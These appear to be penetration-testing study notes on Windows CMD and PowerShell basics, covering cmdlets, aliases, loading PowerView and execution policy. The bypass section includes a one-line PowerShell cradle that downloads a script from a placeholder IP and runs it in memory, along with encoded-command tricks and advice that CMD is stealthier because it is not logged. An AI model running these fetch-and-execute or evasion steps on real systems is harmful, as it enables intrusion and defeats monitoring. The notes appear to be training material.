# Interacting with the Windows Operating System

## Three Ways to Interact with Windows

```
GUI (point & click) → CMD (text commands) → PowerShell (scripting + .NET)
```

---

## CMD — Command Prompt

```bash
# Get help on available commands
help

# Get help on specific command
help schtasks
ipconfig /?

# Common useful commands
ipconfig /all          # full network info
ipconfig /flushdns     # clear DNS cache
ipconfig /displaydns   # show cached DNS entries
```

**Open CMD:** Start Menu → type `cmd`, or `C:\Windows\system32\cmd.exe`, or Win+R → `cmd`

---

## PowerShell — Key Concepts

### Cmdlet Format

```
Verb-Noun (e.g., Get-ChildItem, Set-Location, Get-Service)
```

### Common Cmdlets

```powershell
Get-ChildItem              # list directory (like ls/dir)
Get-ChildItem -Recurse     # recursive listing
Get-ChildItem -Path C:\Users\Administrator\Documents
Set-Location C:\Users      # change directory (like cd)
Get-Content file.txt       # read file (like cat)
Get-Service                # list services
Get-Process                # list processes
Get-Module                 # list loaded modules
```

### Aliases

```powershell
Get-Alias                        # list all aliases
Get-Alias -Name "ls"             # find what ls maps to
New-Alias -Name "Show-Files" Get-ChildItem  # create custom alias
```

Common aliases: `ls`=`Get-ChildItem`, `cd`=`Set-Location`, `cat`=`Get-Content`, `?`=`Where-Object`, `%`=`ForEach-Object`

### Help System

```powershell
Get-Help <cmdlet>              # local help (may be partial)
Get-Help <cmdlet> -Online      # open browser help
Update-Help                    # download help files locally
```

---

## Running PowerShell Scripts

```powershell
# Run script + call function in one line
.\PowerView.ps1; Get-LocalGroup | fl

# Import module (makes all functions available in session)
Import-Module .\PowerView.ps1

# List all loaded modules + their commands
Get-Module | select Name,ExportedCommands | fl
```

**PowerShell ISE** = GUI script editor with autocomplete — good for writing and debugging scripts

---

## Execution Policy

Controls whether scripts can run. **NOT a true security control** — easily bypassed.

| Policy | What it allows |
| --- | --- |
| `AllSigned` | Only scripts signed by trusted publisher |
| `Bypass` | Everything allowed, no warnings |
| `Default` | Restricted (desktop) / RemoteSigned (server) |
| `RemoteSigned` | Local scripts OK; downloaded need signature |
| `Restricted` | No scripts — individual commands only |
| `Undefined` | Falls back to Restricted |
| `Unrestricted` | All scripts run (default on non-Windows) |

```powershell
# Check current policy for all scopes
Get-ExecutionPolicy -List

# Bypass for current session only (most common pentest technique)
Set-ExecutionPolicy Bypass -Scope Process

# Verify change
Get-ExecutionPolicy -List
```

---

## Execution Policy Bypass Methods (Pentesting)

```powershell
# 1. Set bypass for current process (session only, no admin needed)
Set-ExecutionPolicy Bypass -Scope Process

# 2. Download and invoke directly in memory (no file written)
IEX (New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

# 3. Encode as base64 command
powershell -EncodedCommand <base64>

# 4. Pipe script content directly into PowerShell
cat script.ps1 | powershell -
```

> Execution policy = **not a security boundary** — any user can bypass it for their own session
> 

---

## CMD vs PowerShell — Quick Decision

| Use CMD | Use PowerShell |
| --- | --- |
| Simple one-off commands | Complex scripting |
| Batch files | Working with objects (.NET) |
| Stealth (no logging by default) | AD/service administration |
| Old/legacy systems | Modern Windows administration |
| Execution policy may block PS | Automation and scheduled tasks |

---

## Key Takeaways

- PowerShell cmdlets = `Verb-Noun` format — learn the pattern, not every command
- `Get-Alias` = find shortcuts for cmdlets; create your own with `New-Alias`
- Execution policy = **not a real security control** — bypass with `Scope Process` instantly
- `Import-Module` = the standard way to load pentest scripts like PowerView into a session
- `help <command>` (CMD) and `Get-Help <cmdlet>` (PS) = always your first stop
- PowerShell logs commands; CMD does not → **CMD is stealthier for basic tasks**